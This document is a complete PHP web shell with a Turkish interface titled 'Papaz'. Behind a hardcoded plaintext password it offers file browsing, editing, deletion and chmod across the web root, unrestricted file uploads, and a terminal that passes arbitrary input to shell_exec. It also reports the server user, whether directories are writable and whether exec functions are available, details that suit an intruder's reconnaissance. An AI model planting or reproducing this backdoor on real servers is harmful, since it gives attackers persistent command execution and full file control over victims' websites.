<?php


session_start();

// Güvenlik Ayarları
define('ADMIN_PASSWORD', 'Cuan1212@@!!'); // Üretimde hash kullanın
define('MAX_FILE_SIZE', 100 * 1024 * 1024); // 100MB
define('ALLOWED_EXTENSIONS', array('txt', 'php', 'html', 'css', 'js', 'json', 'xml', 'jpg', 'png', 'gif', 'pdf'));

// CSRF Token Oluştur
function generateCSRFToken() {
    if (!isset($_SESSION['csrf_token'])) {
        // PHP 5.x uyumlu rastgele byte üretimi
        if (function_exists('openssl_random_pseudo_bytes')) {
            $_SESSION['csrf_token'] = bin2hex(openssl_random_pseudo_bytes(32));
        } elseif (function_exists('mcrypt_create_iv')) {
            $_SESSION['csrf_token'] = bin2hex(mcrypt_create_iv(32, MCRYPT_DEV_URANDOM));
        } else {
            // Fallback: daha az güvenli ama çalışır
            $_SESSION['csrf_token'] = bin2hex(sha1(uniqid(mt_rand(), true) . microtime(true), true));
        }
    }
    return $_SESSION['csrf_token'];
}

// PHP 5.x uyumlu hash_equals implementasyonu
if (!function_exists('hash_equals')) {
    function hash_equals($known_string, $user_string) {
        if (strlen($known_string) !== strlen($user_string)) {
            return false;
        }
        $result = 0;
        for ($i = 0; $i < strlen($known_string); $i++) {
            $result |= ord($known_string[$i]) ^ ord($user_string[$i]);
        }
        return $result === 0;
    }
}

// CSRF Token Doğrula
function validateCSRFToken($token) {
    return isset($_SESSION['csrf_token']) && hash_equals($_SESSION['csrf_token'], $token);
}

// Güvenli Path Fonksiyonu
function securePath($path, $baseDir = null) {
    if ($baseDir === null) {
        $baseDir = realpath($_SERVER['DOCUMENT_ROOT']);
    }
    
    $realPath = realpath($path);
    
    if ($realPath === false) {
        return false;
    }
    
    // Path traversal saldırılarına karşı koruma
    if (strpos($realPath, $baseDir) !== 0) {
        return false;
    }
    
    return $realPath;
}

// Kullanıcı Doğrulama
$isAuthenticated = isset($_SESSION['authenticated']) && $_SESSION['authenticated'] === true;

// Giriş İşlemi
if (!$isAuthenticated && isset($_POST['password']) && isset($_POST['csrf_token'])) {
    if (validateCSRFToken($_POST['csrf_token'])) {
        if ($_POST['password'] === ADMIN_PASSWORD) {
            $_SESSION['authenticated'] = true;
            $_SESSION['login_time'] = time();
            header("Location: " . $_SERVER['PHP_SELF']);
            exit;
        } else {
            $loginError = "Hatalı şifre!";
        }
    } else {
        $loginError = "Geçersiz istek!";
    }
}

// Çıkış İşlemi
if (isset($_GET['logout'])) {
    session_destroy();
    header("Location: " . $_SERVER['PHP_SELF']);
    exit;
}

// Dosya Boyutu Format
function formatSize($bytes) {
    $units = array('B', 'KB', 'MB', 'GB', 'TB');
    $bytes = max($bytes, 0);
    $pow = floor(($bytes ? log($bytes) : 0) / log(1024));
    $pow = min($pow, count($units) - 1);
    $bytes /= pow(1024, $pow);
    return round($bytes, 2) . ' ' . $units[$pow];
}

// Dosya İkon Belirleme
function getFileIcon($filename) {
    $extension = strtolower(pathinfo($filename, PATHINFO_EXTENSION));
    $icons = array(
        'php' => 'file-code',
        'html' => 'file-code',
        'css' => 'file-code',
        'js' => 'file-code',
        'json' => 'file-code',
        'txt' => 'file-text',
        'pdf' => 'file-text',
        'jpg' => 'image',
        'jpeg' => 'image',
        'png' => 'image',
        'gif' => 'image',
        'zip' => 'file-archive',
        'rar' => 'file-archive',
    );
    return isset($icons[$extension]) ? $icons[$extension] : 'file';
}

// Sistem Bilgileri
function getSystemInfo() {
    $currentPath = isset($_GET['path']) ? $_GET['path'] : getcwd();
    return array(
        'os' => PHP_OS,
        'server' => isset($_SERVER['SERVER_SOFTWARE']) ? $_SERVER['SERVER_SOFTWARE'] : 'Bilinmiyor',
        'php_version' => phpversion(),
        'current_user' => get_current_user(),
        'server_ip' => isset($_SERVER['SERVER_ADDR']) ? $_SERVER['SERVER_ADDR'] : 'Bilinmiyor',
        'disk_free' => disk_free_space('/'),
        'disk_total' => disk_total_space('/'),
        'writable' => is_writable($currentPath),
        'functions' => array(
            'exec' => function_exists('exec'),
            'shell_exec' => function_exists('shell_exec'),
            'system' => function_exists('system'),
        )
    );
}

// Mevcut URL'i Oluştur
function getCurrentURL($currentPath, $isFile = false) {
    $docRoot = realpath($_SERVER['DOCUMENT_ROOT']);
    $relativePath = str_replace($docRoot, '', $currentPath);
    $relativePath = str_replace("\\", "/", $relativePath);
    
    $protocol = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ? 'https' : 'http';
    $host = $_SERVER['HTTP_HOST'];
    
    if ($isFile) {
        // Dosya ise direkt dosya yolunu göster
        return $protocol . '://' . $host . $relativePath;
    } else {
        // Klasör ise sonuna / ekle
        $relativePath = rtrim($relativePath, '/');
        return $protocol . '://' . $host . $relativePath . '/';
    }
}

if ($isAuthenticated) {
    $baseDir = realpath($_SERVER['DOCUMENT_ROOT']);
    $currentPath = isset($_GET['path']) ? securePath($_GET['path'], $baseDir) : $baseDir;
    
    if ($currentPath === false) {
        $currentPath = $baseDir;
    }

    // Dosya İşlemleri
    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['csrf_token'])) {
        if (!validateCSRFToken($_POST['csrf_token'])) {
            $error = "Geçersiz CSRF token!";
        } else {
            // Dosya Yükleme
            if (isset($_FILES['upload_file'])) {
                $uploadFile = $_FILES['upload_file'];
                $targetPath = $currentPath . '/' . basename($uploadFile['name']);
                
                if ($uploadFile['size'] > MAX_FILE_SIZE) {
                    $error = "Dosya boyutu çok büyük! Maksimum: " . formatSize(MAX_FILE_SIZE);
                } elseif (move_uploaded_file($uploadFile['tmp_name'], $targetPath)) {
                    $success = "Dosya başarıyla yüklendi!";
                } else {
                    $error = "Dosya yükleme hatası!";
                }
            }
            
            // Yeni Klasör Oluşturma
            if (isset($_POST['create_folder'])) {
                $folderName = preg_replace('/[^a-zA-Z0-9_\-\.]/', '', $_POST['folder_name']);
                $newFolder = $currentPath . '/' . $folderName;
                
                if (mkdir($newFolder, 0755)) {
                    $success = "Klasör başarıyla oluşturuldu!";
                } else {
                    $error = "Klasör oluşturma hatası!";
                }
            }
            
            // Yeni Dosya Oluşturma
            if (isset($_POST['create_file'])) {
                $fileName = preg_replace('/[^a-zA-Z0-9_\-\.]/', '', $_POST['file_name']);
                $newFile = $currentPath . '/' . $fileName;
                
                if (file_put_contents($newFile, '') !== false) {
                    $success = "Dosya başarıyla oluşturuldu!";
                } else {
                    $error = "Dosya oluşturma hatası!";
                }
            }
            
            // Dosya Düzenleme
            if (isset($_POST['edit_file']) && isset($_POST['file_path'])) {
                $editPath = securePath($_POST['file_path'], $baseDir);
                if ($editPath !== false && is_file($editPath)) {
                    if (file_put_contents($editPath, $_POST['file_content']) !== false) {
                        $success = "Dosya başarıyla kaydedildi!";
                        $editPath = $_POST['file_path']; // Keep in edit mode
                    } else {
                        $error = "Dosya kaydetme hatası!";
                    }
                }
            }
            
            // Dosya/Klasör Silme
            if (isset($_POST['delete']) && isset($_POST['delete_path'])) {
                $deletePath = securePath($_POST['delete_path'], $baseDir);
                if ($deletePath !== false) {
                    if (is_dir($deletePath)) {
                        if (rmdir($deletePath)) {
                            $success = "Klasör başarıyla silindi!";
                        } else {
                            $error = "Klasör boş değil veya silinemedi!";
                        }
                    } elseif (is_file($deletePath)) {
                        if (unlink($deletePath)) {
                            $success = "Dosya başarıyla silindi!";
        } else {
                            $error = "Dosya silme hatası!";
                        }
                    }
                }
            }
            
            // Yeniden Adlandırma
            if (isset($_POST['rename']) && isset($_POST['old_path']) && isset($_POST['new_name'])) {
                $oldPath = securePath($_POST['old_path'], $baseDir);
                $newName = preg_replace('/[^a-zA-Z0-9_\-\.]/', '', $_POST['new_name']);
                $newPath = dirname($oldPath) . '/' . $newName;
                
                if ($oldPath !== false && rename($oldPath, $newPath)) {
                    $success = "İsim başarıyla değiştirildi!";
                } else {
                    $error = "İsim değiştirme hatası!";
                }
            }
            
            // Chmod İşlemi
            if (isset($_POST['chmod']) && isset($_POST['chmod_path']) && isset($_POST['permissions'])) {
                $chmodPath = securePath($_POST['chmod_path'], $baseDir);
                $perms = octdec($_POST['permissions']);
                
                if ($chmodPath !== false && chmod($chmodPath, $perms)) {
                    $success = "İzinler başarıyla değiştirildi!";
        } else {
                    $error = "İzin değiştirme hatası!";
                }
            }
            
            // Komut Çalıştırma (Dikkatli kullanın!)
            if (isset($_POST['run_command']) && isset($_POST['command'])) {
                $command = $_POST['command'];
                $output = shell_exec($command . " 2>&1");
                $commandOutput = $output;
            }
        }
    }
    
    // Dosya İndirme
    if (isset($_GET['download'])) {
        $downloadPath = securePath($_GET['download'], $baseDir);
        if ($downloadPath !== false && is_file($downloadPath)) {
            header('Content-Type: application/octet-stream');
            header('Content-Disposition: attachment; filename="' . basename($downloadPath) . '"');
            header('Content-Length: ' . filesize($downloadPath));
            readfile($downloadPath);
        exit;
    }
}

    // Dizin Listesi
    $items = array();
    if (is_dir($currentPath)) {
        $scan = scandir($currentPath);
        foreach ($scan as $item) {
            if ($item === '.' || $item === '..') continue;
            
            $itemPath = $currentPath . '/' . $item;
            $items[] = array(
                'name' => $item,
                'path' => $itemPath,
                'type' => is_dir($itemPath) ? 'folder' : 'file',
                'size' => is_file($itemPath) ? filesize($itemPath) : 0,
                'modified' => filemtime($itemPath),
                'permissions' => substr(sprintf('%o', fileperms($itemPath)), -4),
                'icon' => is_dir($itemPath) ? 'folder' : getFileIcon($item)
            );
        }
        
        // Sıralama: Klasörler önce
        usort($items, function($a, $b) {
            if ($a['type'] === $b['type']) {
                return strcasecmp($a['name'], $b['name']);
            }
            return $a['type'] === 'folder' ? -1 : 1;
        });
    }
    
    // Breadcrumb
    $relativePath = str_replace($baseDir, '', $currentPath);
    $pathParts = array_filter(explode('/', $relativePath));
    $breadcrumbs = array();
    $tempPath = $baseDir;
    $breadcrumbs[] = array('name' => 'Root', 'path' => $baseDir);

    foreach ($pathParts as $part) {
        $tempPath .= '/' . $part;
        $breadcrumbs[] = array('name' => $part, 'path' => $tempPath);
    }
    
    $systemInfo = getSystemInfo();
    $currentURL = getCurrentURL($currentPath);
}

$csrfToken = generateCSRFToken();
?>
<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Papaz</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap" rel="stylesheet">
    <script src="https://unpkg.com/lucide@latest"></script>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        :root {
            --primary: #3b82f6;
            --success: #10b981;
            --danger: #ef4444;
            --warning: #f59e0b;
            --bg: #f9fafb;
            --surface: #ffffff;
            --border: #e5e7eb;
            --text: #1f2937;
            --text-muted: #6b7280;
        }
        
        body {
            font-family: 'Inter', sans-serif;
            background: var(--bg);
            color: var(--text);
            line-height: 1.6;
        }
        
        .container {
            max-width: 1200px;
            margin: 0 auto;
            padding: 20px;
        }
        
        /* Header */
        .header {
            background: var(--surface);
            border: 1px solid var(--border);
            border-radius: 8px;
            padding: 16px 20px;
            margin-bottom: 20px;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        
        .header h1 {
            font-size: 18px;
            font-weight: 600;
            color: var(--text);
        }
        
        /* Status Bar */
        .status-bar {
            background: var(--surface);
            border: 1px solid var(--border);
            border-radius: 8px;
            padding: 12px 16px;
            margin-bottom: 20px;
            display: flex;
            gap: 24px;
            flex-wrap: wrap;
            font-size: 13px;
        }
        
        .status-item {
            display: flex;
            align-items: center;
            gap: 6px;
            color: var(--text-muted);
        }
        
        .status-item strong {
            color: var(--text);
        }
        
        .status-item a:hover {
            text-decoration: underline !important;
        }
        
        .status-ok {
            color: var(--success);
            font-weight: 600;
        }
        
        .status-error {
            color: var(--danger);
            font-weight: 600;
        }
        
        /* Notifications */
        .notification {
            padding: 12px 16px;
            border-radius: 6px;
            margin-bottom: 16px;
            font-size: 14px;
        }
        
        .notification.success {
            background: #d1fae5;
            color: #065f46;
            border: 1px solid #6ee7b7;
        }
        
        .notification.error {
            background: #fee2e2;
            color: #991b1b;
            border: 1px solid #fca5a5;
        }
        
        /* Layout */
        .layout {
            display: grid;
            grid-template-columns: 1fr 280px;
            gap: 20px;
        }
        
        .panel {
            background: var(--surface);
            border: 1px solid var(--border);
            border-radius: 8px;
            padding: 20px;
        }
        
        .panel-title {
            font-size: 14px;
            font-weight: 600;
            margin-bottom: 16px;
            color: var(--text);
        }
        
        /* Breadcrumb */
        .breadcrumb {
            display: flex;
            align-items: center;
            gap: 8px;
            padding: 12px;
            background: var(--bg);
            border-radius: 6px;
            margin-bottom: 16px;
            font-size: 13px;
            flex-wrap: wrap;
        }
        
        .breadcrumb a {
            color: var(--primary);
            text-decoration: none;
        }
        
        .breadcrumb a:hover {
            text-decoration: underline;
        }
        
        .breadcrumb span {
            color: var(--text-muted);
        }
        
        /* File List */
        .file-list {
            border: 1px solid var(--border);
            border-radius: 6px;
            overflow: hidden;
        }
        
        .file-item {
            display: flex;
            align-items: center;
            padding: 10px 12px;
            border-bottom: 1px solid var(--border);
            transition: background 0.2s;
            cursor: pointer;
        }
        
        .file-item:last-child {
            border-bottom: none;
        }
        
        .file-item:hover {
            background: var(--bg);
        }
        
        .file-icon {
            margin-right: 10px;
            color: var(--text-muted);
            flex-shrink: 0;
        }
        
        .file-name {
            flex: 1;
            font-size: 14px;
            min-width: 0;
            overflow: hidden;
            text-overflow: ellipsis;
            white-space: nowrap;
        }
        
        .file-name-link {
            color: var(--text);
            text-decoration: none;
        }
        
        .file-name-link:hover {
            color: var(--primary);
        }
        
        .file-meta {
            display: flex;
            gap: 12px;
            font-size: 12px;
            color: var(--text-muted);
            margin-right: 12px;
        }
        
        .file-actions {
            display: flex;
            gap: 10px;
            font-size: 13px;
        }
        
        .action-btn {
            padding: 6px 12px;
            background: var(--bg);
            border: 1px solid var(--border);
            cursor: pointer;
            color: var(--text-muted);
            border-radius: 6px;
            transition: all 0.2s;
            text-decoration: none;
            font-weight: 500;
            font-size: 12px;
            min-width: auto;
            white-space: nowrap;
        }
        
        .action-btn:hover {
            background: var(--primary);
            color: white;
            border-color: var(--primary);
            transform: translateY(-1px);
        }
        
        .action-btn.danger {
            background: #fee2e2;
            border-color: #fca5a5;
            color: var(--danger);
        }
        
        .action-btn.danger:hover {
            background: var(--danger);
            color: white;
            border-color: var(--danger);
        }
        
        /* Forms */
        .form-group {
            margin-bottom: 12px;
        }
        
        .form-label {
            display: block;
            margin-bottom: 6px;
            font-size: 13px;
            font-weight: 500;
        }
        
        .form-input, .form-textarea {
            width: 100%;
            padding: 8px 12px;
            border: 1px solid var(--border);
            border-radius: 6px;
            font-family: inherit;
            font-size: 14px;
        }
        
        .form-input:focus, .form-textarea:focus {
            outline: none;
            border-color: var(--primary);
        }
        
        .form-textarea {
            font-family: 'Courier New', monospace;
            min-height: 500px;
            resize: vertical;
        }
        
        /* Buttons */
        .btn {
            padding: 8px 14px;
            border: none;
            border-radius: 6px;
            font-size: 13px;
            font-weight: 500;
            cursor: pointer;
            transition: all 0.2s;
            display: inline-flex;
            align-items: center;
            gap: 6px;
        }
        
        .btn-primary {
            background: var(--primary);
            color: white;
        }
        
        .btn-primary:hover {
            background: #2563eb;
        }
        
        .btn-success {
            background: var(--success);
            color: white;
        }
        
        .btn-success:hover {
            background: #059669;
        }
        
        .btn-danger {
            background: var(--danger);
            color: white;
        }
        
        .btn-danger:hover {
            background: #dc2626;
        }
        
        .btn-outline {
            background: white;
            border: 1px solid var(--border);
            color: var(--text);
        }
        
        .btn-outline:hover {
            background: var(--bg);
        }
        
        .btn-block {
            width: 100%;
            justify-content: center;
        }
        
        /* Terminal */
        .terminal {
            background: #1e1e1e;
            color: #0f0;
            padding: 12px;
            border-radius: 6px;
            font-family: 'Courier New', monospace;
            font-size: 12px;
            white-space: pre-wrap;
            word-wrap: break-word;
            max-height: 200px;
            overflow-y: auto;
            margin-top: 12px;
        }
        
        /* Modal */
        .modal {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0,0,0,0.5);
            z-index: 1000;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }
        
        .modal.active {
            display: flex;
        }
        
        .modal-content {
            background: white;
            border-radius: 8px;
            padding: 24px;
            max-width: 400px;
            width: 100%;
        }
        
        .modal-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 16px;
        }
        
        .modal-title {
            font-size: 16px;
            font-weight: 600;
        }
        
        .modal-close {
            background: none;
            border: none;
            font-size: 24px;
            cursor: pointer;
            color: var(--text-muted);
            padding: 0;
            line-height: 1;
        }
        
        /* Login */
        .login-container {
            display: flex;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
        }
        
        .login-box {
            background: var(--surface);
            border: 1px solid var(--border);
            padding: 32px;
            border-radius: 8px;
            width: 100%;
            max-width: 400px;
        }
        
        .login-box h1 {
            text-align: center;
            margin-bottom: 24px;
            font-size: 20px;
        }
        
        /* Sidebar Section */
        .sidebar-section {
            margin-bottom: 20px;
        }
        
        .sidebar-section:last-child {
            margin-bottom: 0;
        }
        
        /* Info List */
        .info-list {
            font-size: 12px;
        }
        
        .info-list-item {
            display: flex;
            justify-content: space-between;
            padding: 8px 0;
            border-bottom: 1px solid var(--border);
        }
        
        .info-list-item:last-child {
            border-bottom: none;
        }
        
        .info-list-label {
            color: var(--text-muted);
        }
        
        .info-list-value {
            color: var(--text);
            font-weight: 500;
            text-align: right;
        }
        
        /* Empty State */
        .empty-state {
            text-align: center;
            padding: 40px 20px;
            color: var(--text-muted);
        }
        
        /* Responsive */
        @media (max-width: 768px) {
            .layout {
                grid-template-columns: 1fr;
            }
            
            .file-meta {
                display: none;
            }
            
            .file-actions {
                flex-wrap: wrap;
                gap: 6px;
            }
            
            .action-btn {
                font-size: 11px;
                padding: 5px 10px;
            }
            
            .status-bar {
                font-size: 12px;
                gap: 16px;
            }
        }
        
        @media (max-width: 1200px) {
            .file-item {
                flex-wrap: wrap;
            }
            
            .file-actions {
                flex-basis: 100%;
                margin-top: 8px;
                padding-left: 26px;
            }
        }
    </style>
</head>
<body>

<?php if (!$isAuthenticated): ?>
    <!-- Login -->
    <div class="login-container">
        <div class="login-box">
            <h1>Papaz</h1>
            
            <?php if (isset($loginError)): ?>
                <div class="notification error"><?= htmlspecialchars($loginError) ?></div>
            <?php endif; ?>
            
            <form method="POST">
                <input type="hidden" name="csrf_token" value="<?= $csrfToken ?>">
                <div class="form-group">
                    <input type="password" name="password" class="form-input" placeholder="Şifre girin" required autofocus>
                </div>
                <button type="submit" class="btn btn-primary btn-block">Giriş Yap</button>
        </form>
        </div>
    </div>
<?php else: ?>
    <!-- Main App -->
    <div class="container">
        <!-- Header -->
        <div class="header">
            <h1>Papaz💤 </h1>
            <a href="?logout=1" class="btn btn-danger">Çıkış</a>
        </div>
        
        <?php if (!isset($_GET['edit'])): ?>
        <!-- Status Bar -->
        <div class="status-bar">
            <div class="status-item">
                <i data-lucide="hard-drive" style="width: 14px; height: 14px;"></i>
                <span><strong><?= htmlspecialchars($systemInfo['os']) ?></strong></span>
            </div>
            <div class="status-item">
                <i data-lucide="code" style="width: 14px; height: 14px;"></i>
                <span>PHP <strong><?= htmlspecialchars($systemInfo['php_version']) ?></strong></span>
            </div>
            <div class="status-item">
                <i data-lucide="user" style="width: 14px; height: 14px;"></i>
                <span><strong><?= htmlspecialchars($systemInfo['current_user']) ?></strong></span>
            </div>
            <div class="status-item">
                <i data-lucide="edit" style="width: 14px; height: 14px;"></i>
                <span>Yazılabilir: <strong class="<?= $systemInfo['writable'] ? 'status-ok' : 'status-error' ?>"><?= $systemInfo['writable'] ? 'EVET' : 'HAYIR' ?></strong></span>
            </div>
            <div class="status-item">
                <i data-lucide="terminal" style="width: 14px; height: 14px;"></i>
                <span>Komut: <strong class="<?= $systemInfo['functions']['shell_exec'] ? 'status-ok' : 'status-error' ?>"><?= $systemInfo['functions']['shell_exec'] ? 'AKTİF' : 'PASİF' ?></strong></span>
            </div>
            <div class="status-item">
                <i data-lucide="database" style="width: 14px; height: 14px;"></i>
                <span><strong><?= formatSize($systemInfo['disk_free']) ?></strong> / <?= formatSize($systemInfo['disk_total']) ?></span>
            </div>
            <div class="status-item" style="flex-basis: 100%; margin-top: 4px;">
                <i data-lucide="globe" style="width: 14px; height: 14px;"></i>
                <span>URL: <a href="<?= htmlspecialchars($currentURL) ?>" target="_blank" style="color: var(--primary); text-decoration: none;"><strong><?= htmlspecialchars($currentURL) ?></strong></a></span>
            </div>
        </div>
        <?php endif; ?>
        
        <!-- Notifications -->
        <?php if (isset($success)): ?>
            <div class="notification success"><?= htmlspecialchars($success) ?></div>
        <?php endif; ?>
        
        <?php if (isset($error)): ?>
            <div class="notification error"><?= htmlspecialchars($error) ?></div>
        <?php endif; ?>
        
            <?php if (isset($_GET['edit'])): ?>
            <!-- Edit Mode -->
                <?php
            $editPath = securePath($_GET['edit'], $baseDir);
            if ($editPath !== false && is_file($editPath)):
                $currentURL = getCurrentURL($editPath, true);
                ?>
                <!-- File URL Info -->
            <div class="status-bar" style="margin-bottom: 20px;">
                <div class="status-item" style="flex-basis: 100%;">
                    <i data-lucide="globe" style="width: 14px; height: 14px;"></i>
                    <span>Dosya URL: <a href="<?= htmlspecialchars($currentURL) ?>" target="_blank" style="color: var(--primary); text-decoration: none;"><strong><?= htmlspecialchars($currentURL) ?></strong></a></span>
                </div>
            </div>
            
                <div class="panel">
                <div class="panel-title">Dosya Düzenle: <?= htmlspecialchars(basename($editPath)) ?></div>
                
                <a href="?path=<?= urlencode(dirname($editPath)) ?>" class="btn btn-outline" style="margin-bottom: 16px;">
                    ← Geri
                </a>
                
                <form method="POST">
                    <input type="hidden" name="csrf_token" value="<?= $csrfToken ?>">
                    <input type="hidden" name="file_path" value="<?= htmlspecialchars($editPath) ?>">
                    <input type="hidden" name="edit_file" value="1">
                    
                    <div class="form-group">
                        <textarea name="file_content" class="form-textarea"><?= htmlspecialchars(file_get_contents($editPath)) ?></textarea>
                    </div>
                    
                    <button type="submit" class="btn btn-success">Kaydet</button>
                    </form>
                </div>
                <?php endif; ?>
            <?php else: ?>
            <!-- Browse Mode -->
            <div class="layout">
                <!-- Main Panel -->
                <div class="panel">
                    <div class="panel-title">Dosyalar</div>
                    
                    <!-- Breadcrumb -->
                    <div class="breadcrumb">
                        <?php foreach ($breadcrumbs as $index => $crumb): ?>
                            <?php if ($index > 0): ?>
                                <span>/</span>
                        <?php endif; ?>
                            
                                <?php if ($index < count($breadcrumbs) - 1): ?>
                                    <a href="?path=<?= urlencode($crumb['path']) ?>"><?= htmlspecialchars($crumb['name']) ?></a>
                                <?php else: ?>
                                    <span><?= htmlspecialchars($crumb['name']) ?></span>
                                <?php endif; ?>
                            <?php endforeach; ?>
                        </div>
                    
                    <!-- File List -->
                    <?php if (empty($items)): ?>
                        <div class="empty-state">Bu klasör boş</div>
                    <?php else: ?>
                        <div class="file-list">
                            <?php if ($currentPath !== $baseDir): ?>
                                <a href="?path=<?= urlencode(dirname($currentPath)) ?>" style="text-decoration: none;">
                                    <div class="file-item">
                                        <i data-lucide="corner-up-left" class="file-icon" style="width: 16px; height: 16px;"></i>
                                        <div class="file-name">..</div>
                    </div>
                                </a>
                            <?php endif; ?>
                            
                            <?php foreach ($items as $item): ?>
                                <div class="file-item">
                                    <i data-lucide="<?= $item['icon'] ?>" class="file-icon" style="width: 16px; height: 16px;"></i>
                                    
                                    <?php if ($item['type'] === 'folder'): ?>
                                        <a href="?path=<?= urlencode($item['path']) ?>" class="file-name file-name-link">
                                            <?= htmlspecialchars($item['name']) ?>
                                        </a>
                                    <?php else: ?>
                                        <a href="?edit=<?= urlencode($item['path']) ?>" class="file-name file-name-link">
                                            <?= htmlspecialchars($item['name']) ?>
                                        </a>
                                    <?php endif; ?>
                                    
                                    <div class="file-meta">
                                        <?php if ($item['type'] === 'file'): ?>
                                            <span><?= formatSize($item['size']) ?></span>
                                        <?php endif; ?>
                                        <span><?= date('d.m.Y H:i', $item['modified']) ?></span>
                                    </div>
                                    
                                    <div class="file-actions">
                                        <?php if ($item['type'] === 'file'): ?>
                                            <a href="?edit=<?= urlencode($item['path']) ?>" class="action-btn">Düzenle</a>
                                            <a href="?download=<?= urlencode($item['path']) ?>" class="action-btn">İndir</a>
                                        <?php endif; ?>
                                        <button class="action-btn" onclick="openRenameModal('<?= htmlspecialchars($item['path']) ?>', '<?= htmlspecialchars($item['name']) ?>')">Yeniden Adlandır</button>
                                        <button class="action-btn" onclick="openChmodModal('<?= htmlspecialchars($item['path']) ?>', '<?= $item['permissions'] ?>')">İzinler</button>
                                        <button class="action-btn danger" onclick="deleteItem('<?= htmlspecialchars($item['path']) ?>', '<?= htmlspecialchars($item['name']) ?>')">Sil</button>
                                    </div>
                                </div>
                            <?php endforeach; ?>
                        </div>
                    <?php endif; ?>
                </div>
                
                <!-- Sidebar -->
                <div>
                    <!-- Upload -->
                    <div class="panel sidebar-section">
                        <div class="panel-title">Yükle</div>
                        <form method="POST" enctype="multipart/form-data">
                            <input type="hidden" name="csrf_token" value="<?= $csrfToken ?>">
                            <div class="form-group">
                                <input type="file" name="upload_file" class="form-input" required>
                            </div>
                            <button type="submit" class="btn btn-primary btn-block">Yükle</button>
                        </form>
                    </div>
                    
                    <!-- Create -->
                    <div class="panel sidebar-section">
                        <div class="panel-title">Yeni Oluştur</div>
                        <form method="POST">
                            <input type="hidden" name="csrf_token" value="<?= $csrfToken ?>">
                            <div class="form-group">
                                <input type="text" name="file_name" class="form-input" placeholder="Dosya adı" required>
                            </div>
                            <button type="submit" name="create_file" class="btn btn-success btn-block">Dosya</button>
                                    </form>
                        
                        <form method="POST" style="margin-top: 8px;">
                            <input type="hidden" name="csrf_token" value="<?= $csrfToken ?>">
                            <div class="form-group">
                                <input type="text" name="folder_name" class="form-input" placeholder="Klasör adı" required>
                            </div>
                            <button type="submit" name="create_folder" class="btn btn-primary btn-block">Klasör</button>
                                    </form>
                    </div>
                    
                    <!-- Terminal -->
                    <div class="panel sidebar-section">
                        <div class="panel-title">Terminal</div>
                        <form method="POST">
                            <input type="hidden" name="csrf_token" value="<?= $csrfToken ?>">
                            <div class="form-group">
                                <input type="text" name="command" class="form-input" placeholder="Komut" required>
                            </div>
                            <button type="submit" name="run_command" class="btn btn-primary btn-block">Çalıştır</button>
                        </form>
                        
                        <?php if (isset($commandOutput)): ?>
                            <div class="terminal"><?= htmlspecialchars($commandOutput) ?></div>
                        <?php endif; ?>
                    </div>
                    </div>
                </div>
            <?php endif; ?>
        </div>

    <!-- Modals -->
    <div id="renameModal" class="modal">
        <div class="modal-content">
            <div class="modal-header">
                <h3 class="modal-title">Yeniden Adlandır</h3>
                <button class="modal-close" onclick="closeModal('renameModal')">&times;</button>
            </div>
            <form method="POST">
                <input type="hidden" name="csrf_token" value="<?= $csrfToken ?>">
                <input type="hidden" name="old_path" id="rename_old_path">
                <input type="hidden" name="rename" value="1">
                <div class="form-group">
                    <input type="text" name="new_name" id="rename_new_name" class="form-input" required>
                </div>
                <button type="submit" class="btn btn-primary btn-block">Kaydet</button>
                </form>
        </div>
    </div>
    
    <div id="chmodModal" class="modal">
        <div class="modal-content">
            <div class="modal-header">
                <h3 class="modal-title">İzinleri Değiştir</h3>
                <button class="modal-close" onclick="closeModal('chmodModal')">&times;</button>
            </div>
            <form method="POST">
                <input type="hidden" name="csrf_token" value="<?= $csrfToken ?>">
                <input type="hidden" name="chmod_path" id="chmod_path">
                <input type="hidden" name="chmod" value="1">
                <div class="form-group">
                    <input type="text" name="permissions" id="chmod_permissions" class="form-input" pattern="[0-7]{4}" required>
            </div>
                <button type="submit" class="btn btn-primary btn-block">Kaydet</button>
            </form>
        </div>
    </div>
    
    <form id="deleteForm" method="POST" style="display: none;">
        <input type="hidden" name="csrf_token" value="<?= $csrfToken ?>">
        <input type="hidden" name="delete_path" id="delete_path">
        <input type="hidden" name="delete" value="1">
    </form>

<script>
    lucide.createIcons();
        
        function openRenameModal(path, name) {
            document.getElementById('rename_old_path').value = path;
            document.getElementById('rename_new_name').value = name;
            document.getElementById('renameModal').classList.add('active');
        }
        
        function openChmodModal(path, permissions) {
            document.getElementById('chmod_path').value = path;
            document.getElementById('chmod_permissions').value = permissions;
            document.getElementById('chmodModal').classList.add('active');
        }
        
        function closeModal(modalId) {
            document.getElementById(modalId).classList.remove('active');
        }
        
        function deleteItem(path, name) {
            if (confirm('Silmek istediğinizden emin misiniz?\n\n' + name)) {
                document.getElementById('delete_path').value = path;
                document.getElementById('deleteForm').submit();
            }
        }
        
        window.onclick = function(event) {
            if (event.target.classList.contains('modal')) {
                event.target.classList.remove('active');
            }
        }
        
        setTimeout(function() {
            const notifications = document.querySelectorAll('.notification');
            notifications.forEach(function(notification) {
                notification.style.opacity = '0';
                notification.style.transition = 'opacity 0.5s';
                setTimeout(function() {
                    notification.remove();
                }, 500);
            });
        }, 5000);
</script>
<?php endif; ?>

</body>
</html>
